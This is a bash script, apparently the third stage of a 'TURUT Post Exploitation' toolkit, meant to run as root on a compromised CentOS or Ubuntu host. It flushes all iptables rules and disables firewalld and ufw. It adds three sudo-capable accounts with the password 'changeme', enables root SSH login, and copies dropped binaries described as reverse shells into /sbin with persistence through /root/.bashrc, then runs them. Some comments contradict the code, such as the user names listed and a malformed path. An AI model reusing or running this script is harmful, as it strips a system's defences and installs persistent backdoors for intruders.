#!/bin/bash

# This is the third stage of the TURUT Post Exploitation project:
# This script must be run as root
# Its functions are as follows:
#	- Restore /usr/bin/passwd from /tmp/passwd
#	- Add three admin users: jhancock, tgoodman, bmiller
#	- Disable firewall
#	- Enable root login over ssh
#	- Establish planting of PRISM reverse shell within ~/.bashrc and /sbin
#	- Execute Reverse Shell[s]
#	- Cleanup all files dropped:
#		+ "fungus" dir in /home/[user]/
#		+ the fungus.tar

# Restore Mount functionality
echo y | mv /tmp/bak /usr/bin/passwd

# Check Release to see if Ubuntu/CentOS
if [[ -f /etc/centos-release ]]
then
	#echo "CentOS" > /root/version.txt

	### DISABLE FIREWALL ###
	
	# OLD
	#service ipchains stop &>/dev/null
	#service iptables stop &>/dev/null
	#chkconfig ipchains off &>/dev/null
	#chkconfig iptables off &>/dev/null

	# NEW
	iptables -X & /dev/null
    	iptables -F &> /dev/null
    	iptables -t nat -F &> /dev/null
    	iptables -t nat -X &> /dev/null
    	iptables -t mangle -F &> /dev/null
    	iptables -t mangle -X &> /dev/null
	iptables -P INPUT ACCEPT &> /dev/null
    	iptables -P FORWARD ACCEPT &> /dev/null
    	iptables -P OUTPUT ACCEPT &> /dev/null

	# For the Newer versions
	firewall-cmd stop &>/dev/null
	firewall-cmd disable &>/dev/null
	
	### ADD USERS ###
	useradd -G wheel jmorris &>/dev/null
	echo "jmorris:changeme" | chpasswd &>/dev/null
	useradd -G wheel tgoodman &>/dev/null
	echo "tgoodman:changeme" | chpasswd &>/dev/null
	useradd -G wheel bmiller &>/dev/null
	echo "bmiller:changeme" | chpasswd &>/dev/null
	
	# Ensure sudo is working correctly
	sed -i 's/^#\s*\(%wheel\s*ALL=(ALL)\s*NOPASSWD:\s*ALL\)/\1/' /etc/sudoers &>/dev/null

	# Enable root login through ssh

	
elif [[ -f /etc/debian_version ]]
then
	#echo "Ubuntu" > /root/version.txt
	
	### DISABLE FIREWALL ON UBUNTU ###
	iptables -X & /dev/null
        iptables -F &> /dev/null
        iptables -t nat -F &> /dev/null
        iptables -t nat -X &> /dev/null
        iptables -t mangle -F &> /dev/null
        iptables -t mangle -X &> /dev/null
        iptables -P INPUT ACCEPT &> /dev/null
        iptables -P FORWARD ACCEPT &> /dev/null
        iptables -P OUTPUT ACCEPT &> /dev/null

	# UFW just in case...
	ufw disable &>/dev/null
	
	### ADD USERS ###
        useradd -G sudo jmorris &>/dev/null
        echo "jmorris:changeme" | chpasswd &>/dev/null
        useradd -G sudo tgoodman &>/dev/null
        echo "tgoodman:changeme" | chpasswd &>/dev/null
        useradd -G sudo bmiller &>/dev/null
        echo "bmiller:changeme" | chpasswd &>/dev/null
fi

# Enable Root login over ssh
sed 's/#\?\(PermitRootLogin\s*\).*$/\1 yes/' /etc/ssh/sshd_config > temp.txt
mv temp.txt /etc/ssh/sshd_config
rm -f temp.txt

# Enable 
chown root:root /home/dreed/fungus/spores/fsdisk
chown root:root /home//fungus/spores/devutil
chown root:root /home/dreed/fungus/spores/utilman
chown root:root /home/dreed/fungus/spores/dev-worker

chmod +x /home/dreed/fungus/spores/fsdisk
chmod +x /home/dreed/fungus/spores/devutil
chmod +x /home/dreed/fungus/spores/utilman
chmod +x /home/dreed/fungus/spores/dev-worker

# Plant and Persist
mv /home/dreed/fungus/spores/* /sbin/
echo '/sbin/fsdisk &' >> /root/.bashrc
echo '/sbin/devutil &' >> /root/.bashrc
echo '/sbin/utilman &' >> /root/.bashrc
echo '/sbin/dev-worker &' >> /root/.bashrc

# Execute
cd /sbin/
./fsdisk &
./devutil &
./utilman &
./dev-worker &
disown

#echo y | rm -rf /home/dreed/fungus.tar
#echo y | rm -rf /home/dreed/fungus/

echo IF9fX19fX18gLi0uIC4tLiwtLS0uICAuLS4gLi0uIF9fX19fX18gCnxfXyAgIF9ffHwgfCB8IHx8IC4tLlwgfCB8IHwgfHxfXyAgIF9ffAogICl8IHwgICB8IHwgfCB8fCBgLScvIHwgfCB8IHwgICl8IHwgICAKIChfKSB8ICAgfCB8IHwgfHwgICAoICB8IHwgfCB8IChfKSB8ICAgCiAgIHwgfCAgIHwgYC0nKXx8IHxcIFwgfCBgLScpfCAgIHwgfCAgIAogICBgLScgICBgLS0tKF8pfF98IFwpXGAtLS0oXykgICBgLScgICAKICAgICAgICAgICAgICAgICAgICAoX18pICAgICAgICAgICAgICAgCgpBIExvdmVseSBQd24gYnkgMHhkZWNhZQo= | base64 -d | wall

exit 0

